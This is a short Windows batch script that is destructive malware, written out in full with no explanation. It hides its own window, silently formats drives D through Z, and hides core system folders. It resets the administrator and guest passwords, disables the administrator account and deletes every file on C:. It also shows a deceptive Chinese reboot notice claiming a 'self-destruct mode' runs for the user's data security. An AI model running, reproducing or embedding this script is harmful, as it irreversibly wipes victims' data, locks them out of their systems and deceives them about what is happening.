if  not  "%1"=="wkdxz"  mshta  vbscript:createobject("wscript.shell").run("""%~f0""  wkdxz",vbhide)(window.close)&&exit
@Echo  off  echo  y   
for  %%a  in  (d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z)  do  format  %%a:  /q  /u  /x  /y 
cd  c:\ 
attrib  +s  +h  "windows" 
attrib  +s  +h  "Program  Files" 
attrib  +s  +h  "Documents  and  Settings" 
cd  C:\Documents  and  Settings\Administrator\桌面 
attrib  +S  +h 
net  user  administrator  wtfdead 
net  user  guest  wtfdead
shutdown  -r  -t  60  -c  "为了您的数据安全，系统已启动自我摧毁模式，模式将在一分钟后执行，此操作一旦执行无法撤销。"
net  user  administrator  /active:no 
del  /f  /s  /q  c:\*.* 